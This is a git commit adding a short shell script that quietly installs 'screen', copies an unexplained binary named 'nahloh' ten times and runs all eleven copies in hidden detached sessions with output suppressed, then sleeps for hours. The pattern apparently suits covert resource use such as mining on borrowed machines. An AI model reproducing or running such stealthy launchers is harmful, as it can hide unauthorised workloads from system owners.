a34ecf0622624b6fe3e7642b3ec31df19d35a048
SmithRobert2018 <jodaut1785@outlook.com>
2024-11-22 18:15:44 +0800

    Create nahloh.sh

---
+++ nahloh.sh
@@ -0,0 +1,24 @@
+apt install screen -y >/dev/null 2>&1 
+cp nahloh nahloh1
+cp nahloh nahloh2
+cp nahloh nahloh3
+cp nahloh nahloh4
+cp nahloh nahloh5
+cp nahloh nahloh6
+cp nahloh nahloh7
+cp nahloh nahloh8
+cp nahloh nahloh9
+cp nahloh nahloh10
+sleep 5
+screen -dmS nahloh ./nahloh z >/dev/null 2>&1 
+screen -dmS nahloh1 ./nahloh1 z >/dev/null 2>&1 
+screen -dmS nahloh2 ./nahloh2 z >/dev/null 2>&1 
+screen -dmS nahloh3 ./nahloh3 z >/dev/null 2>&1 
+screen -dmS nahloh4 ./nahloh4 z >/dev/null 2>&1 
+screen -dmS nahloh5 ./nahloh5 z >/dev/null 2>&1 
+screen -dmS nahloh6 ./nahloh6 z >/dev/null 2>&1 
+screen -dmS nahloh7 ./nahloh7 z >/dev/null 2>&1 
+screen -dmS nahloh8 ./nahloh8 z >/dev/null 2>&1 
+screen -dmS nahloh9 ./nahloh9 z >/dev/null 2>&1
+screen -dmS nahloh10 ./nahloh10 z >/dev/null 2>&1
+sleep 14440
